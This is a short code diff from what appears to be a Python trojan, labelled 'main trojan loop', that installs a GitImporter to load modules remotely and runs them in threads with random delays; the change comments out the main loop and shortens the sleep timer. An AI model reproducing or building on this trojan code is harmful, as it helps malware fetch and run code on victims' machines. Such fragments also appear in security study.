@@ -118,7 +118,7 @@ def module_runner(module):
 # main trojan loop
 sys.meta_path = [GitImporter()]
 
-while True:
+#while True:
 
     if task_queue.empty():
 
@@ -129,4 +129,4 @@ while True:
             t.start()
             time.sleep(random.randint(1, 10))
 
-    time.sleep(random.randint(1000, 10000))
+    time.sleep(random.randint(10, 20))
